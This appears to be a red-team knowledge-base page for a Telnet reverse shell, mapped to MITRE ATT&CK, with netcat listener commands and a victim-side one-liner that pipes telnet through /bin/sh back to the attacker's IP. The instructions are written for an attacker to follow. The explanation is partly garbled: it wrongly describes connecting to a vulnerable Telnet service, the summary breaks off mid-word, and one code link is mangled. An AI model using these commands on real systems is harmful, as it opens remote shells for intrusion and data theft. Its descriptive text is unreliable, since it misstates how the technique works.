---
id: f6bc13bc-c709-45d8-80f8-224709b2590d
name: Telnet Reverse Shell
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:24.599098+00:00'
updated_at: '2023-04-10T20:25:31.606372+00:00'
tactics:
- '[[Command and Control|TA0011 - Command and Control]]'
techniques:
- '[[Remote Access Tools|T1219 - Remote Access Tools]]'
tags:
- '[[Reverse Shell]]'
- '[[Reverse Shell Cheat Sheet]]'
- '[[Telnet]]'
commands:
- '[[Run command on Victim machine]]'
- '[[Start two listeners on Attacker machine]]'
---

# Telnet Reverse Shell

## Summary

The Telnet reverse shell technique is used to establish a remote connection to a target system using the Telnet protocol. This technique is commonly used by attackers to gain unauthorized access to a target system. The attacker can use this technique to execute commands on the target system, exfilt

## Description

# Description

The Telnet reverse shell technique is used to establish a remote connection to a target system using the Telnet protocol. This technique is commonly used by attackers to gain unauthorized access to a target system. The attacker can use this technique to execute commands on the target system, exfiltrate data, or to pivot to other systems on the network.

To establish a Telnet reverse shell, the attacker first needs to find a vulnerable Telnet service on the target system. Once a vulnerable Telnet service is found, the attacker can use a Telnet client to connect to the service and execute commands on the target system. The attacker can then use various techniques to maintain persistence on the target system and evade detection.

From a business perspective, this technique can be used to gain access to sensitive data and systems, which can result in financial loss, reputational damage, and legal consequences.

## Requirements

1. Access to a vulnerable Telnet service on the target system

1. A Telnet client for establishing the reverse shell

## Defense

1. Disable or restrict access to Telnet services on critical systems

1. Implement network segmentation to limit lateral movement

1. Use network monitoring tools to detect and alert on Telnet traffic

## Objectives

1. Establish a remote connection to a target system

1. Execute commands on the target system

1. Exfiltrate data from the target system

1. Pivot to other systems on the network

# Instructions

1. To establish a reverse shell with Telnet, follow the steps below:
1. On the attacker machine, start two listeners using the following commands:
   nc -lvp 8080
   nc -lvp 8081
2. On the victim machine, run the following command:
   telnet <Your_IP> 8080 | /bin/sh | telnet <Your_IP> 8081
3. Once executed, you will have a reverse shell connection to the attacker machine.

**Code**: [[In Attacker machine start two listeners:
nc -lvp 8]]

> This command is used to establish a reverse shell connection from the victim machine to the attacker machine using Telnet. The attacker needs to start two listeners on their machine, one for each port 8080 and 8081. The victim machine then connects to the attacker machine using Telnet and pipes the output to /bin/sh, which allows the attacker to execute commands on the victim machine. The connection is then redirected to the second listener on port 8081, which allows the attacker to receive the output of the executed commands on their machine.

**Command** ([[Start two listeners on Attacker machine]]):

```bash
nc -lvp 8080
nc -lvp 8081

```

**Command** ([[Run command on Victim machine]]):

```bash
telnet <Your_IP> 8080 | /bin/sh | telnet <Your_IP> 8081
```

## MITRE ATT&CK Mapping

### Tactics

- [[Command and Control|TA0011 - Command and Control]]

### Techniques

- [[Remote Access Tools|T1219 - Remote Access Tools]]

## Commands Used

- [[Run command on Victim machine]]
- [[Start two listeners on Attacker machine]]

## Tags

- [[Reverse Shell]]
- [[Reverse Shell Cheat Sheet]]
- [[Telnet]]
